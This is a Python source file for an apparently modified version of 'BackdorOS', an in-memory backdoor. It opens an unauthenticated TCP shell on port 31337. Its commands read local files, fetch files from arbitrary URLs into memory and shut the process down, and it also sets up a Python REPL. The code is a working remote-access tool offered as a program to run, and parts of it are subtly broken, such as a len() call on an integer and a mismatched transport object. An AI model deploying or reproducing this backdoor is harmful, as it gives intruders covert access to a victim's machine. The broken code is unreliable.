#!/usr/bin/env python3
import sys
import socket
import importlib.util
import asyncio
import io
import platform
import urllib.request
import datetime
import subprocess
import getpass
import os
import shlex
import multiprocessing
import code

# Suprimir advertencias
import warnings
warnings.filterwarnings("ignore")

####################
# Global Variables #
####################
_mem_storage = {}
_mem_storage_size = 0
_is_alive = True
_start_date = datetime.datetime.now().replace(microsecond=0)
_is_debug = False
__version__ = "0.1.0"
__author__ = "Itzik Kotler"
__copyright__ = "Copyright 2019, SafeBreach"

###########
# Classes #
###########

class IOProxy:
    def __init__(self, proxy, prefix=''):
        self._proxy = proxy
        self._prefix = prefix

    def write(self, str):
        # Caracteres especiales
        if str in ('\n', '\t', '\r'):
            self._proxy.push(str)
        else:
            self._proxy.push(f'{self._prefix}: {str}')

class VirtualFile(io.StringIO):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__total_size = 0

    def write(self, str):
        global _mem_storage_size
        super().write(str)
        self.__total_size += len(str)
        _mem_storage_size += self.__total_size

    def close(self, force=False):
        global _mem_storage_size
        if force:
            _mem_storage_size -= self.__total_size
            super().close()

    def getsize(self):
        return self.__total_size

class ShellHandler(asyncio.Protocol):
    def __init__(self, loop):
        self.loop = loop
        self.transport = None
        self.buffer = ""
        self._childs = {}
        self._in_repl = False
        self._repl_instance = code.InteractiveConsole()
        self._stdout = None
        self._stderr = None
        self._in_cat = False
        self._in_cat_buffer = ""
        self._in_cat_filename = ""

    def connection_made(self, transport):
        self.transport = transport
        self.transport.write(f"BackdorOS release {__version__} on an {platform.platform()}\n%> ".encode())

    def data_received(self, data):
        self.buffer += data.decode()
        self.process_buffer()

    def process_buffer(self):
        while '\n' in self.buffer:
            line, self.buffer = self.buffer.split('\n', 1)
            self.parse(line)

    def parse(self, data):
        if self._in_cat:
            self._in_cat_buffer += data
            if 'EOF' in self._in_cat_buffer:
                self._in_cat_buffer = self._in_cat_buffer.replace('EOF', '', 1)
                self._do_WRITE(['+', self._in_cat_filename])
        elif self._in_repl:
            if data.startswith('exit()'):
                self.transport.write("=== PYREPL END ===\n".encode())
                self._in_repl = False
                self._stdout = sys.stdout
                self._stderr = sys.stderr
            else:
                more = self._repl_instance.push(data)
                self.transport.write((sys.ps2 if more else sys.ps1).encode())
        else:
            cmd_params = shlex.split(data)
            cmd_name = cmd_params[0].upper()
            if cmd_name in ShellHandler._COMMANDS:
                if len(cmd_params) - 1 >= ShellHandler._COMMANDS[cmd_name].get('ARGC', 0):
                    getattr(self, f"_do_{cmd_name}", self._unknown_command)(cmd_params[1:])
                else:
                    self.transport.write(f"{cmd_name}: Not enough parameters\n".encode())
            else:
                self.transport.write(f"KERNEL: Unknown command: {cmd_name}\n".encode())

        if self._in_cat:
            self.transport.write(b'')
        elif self._in_repl:
            pass
        else:
            self.transport.write(b'%> ')

    # Definición de comandos
    _COMMANDS = {
        "WRITE": {"DESC": "write file to mem", "USAGE": "[-|url] [filename]", "ARGC": 2},
        "READ": {"DESC": "read file from mem/disk", "USAGE": "[path]", "ARGC": 1},
        "DELETE": {"DESC": "delete file from mem", "USAGE": "[filename]", "ARGC": 1},
        "DIR": {"DESC": "list all files on mem"},
        "HELP": {"DESC": "print this screen"},
        "QUIT": {"DESC": "close this session"},
        "REBOOT": {"DESC": "stopping and restarting the system"},
        "SHUTDOWN": {"DESC": "close down the system"},
        "UPTIME": {"DESC": "print how long the system has been running"},
    }

    def _unknown_command(self, params):
        self.transport.write(f"KERNEL: Unknown command\n".encode())

    def _do_WRITE(self, params):
        if params[0] == '-':
            self.transport.write(f"WRITE: Saving to mem file <{params[1]}> until you type 'EOF'\n".encode())
            self._in_cat = True
            self._in_cat_buffer = ""
            self._in_cat_filename = params[1]
        else:
            output_data = urllib.request.urlopen(params[0]).read() if params[0].startswith('http') else open(params[0]).read()
            _mem_storage[params[1]] = VirtualFile()
            _mem_storage[params[1]].write(output_data)
            self.transport.write(f"WRITE: Saved ({len(output_data)} bytes) to mem file <{params[1]}>\n".encode())

    def _do_READ(self, params):
        if params[0] in _mem_storage:
            self.transport.write(_mem_storage[params[0]].getvalue().encode())
        else:
            self.transport.write(f"READ: File {params[0]} not found\n".encode())

    def _do_DELETE(self, params):
        if params[0] in _mem_storage:
            del _mem_storage[params[0]]
            self.transport.write(f"DELETE: Removed mem file {params[0]}\n".encode())
        else:
            self.transport.write(f"DELETE: Unable to find mem file {params[0]}\n".encode())

    def _do_DIR(self, params):
        global _mem_storage_size
        output = f"DIR: There are {len(_mem_storage)} file(s) that sum to {len(_mem_storage_size)} bytes of memory\n"
        self.transport.write(output.encode())

    def _do_HELP(self, params):
        output = f"BackdorOS release {__version__} on an {platform.platform()}\n"
        for cmd in self._COMMANDS.keys():
            output += f"{cmd}: {self._COMMANDS[cmd]['DESC']}\n"
        self.transport.write(output.encode())

    def _do_QUIT(self, params):
        self.transport.write(b'Bye!\n')
        self.transport.close()

    def _do_REBOOT(self, params):
        raise SystemExit('Server is rebooting!')

    def _do_SHUTDOWN(self, params):
        global _is_alive
        _is_alive = False
        raise SystemExit('Server is shutting down!')

    def _do_UPTIME(self, params):
        global _start_date
        self.transport.write(f'UPTIME: Up {datetime.datetime.now() - _start_date}\n'.encode())

class ShellServer:
    def __init__(self, host='', port=31337):
        self.host = host
        self.port = port

    async def start_server(self):
        server = await asyncio.start_server(self.create_shell_handler, self.host, self.port)
        async with server:
            await server.serve_forever()

    async def create_shell_handler(self, reader, writer):
        handler = ShellHandler(asyncio.get_event_loop())
        handler.connection_made(writer)
        while _is_alive:
            data = await reader.read(100)
            if not data:
                break
            handler.data_received(data)

def main():
    server = ShellServer()
    asyncio.run(server.start_server())

if __name__ == "__main__":
    main()
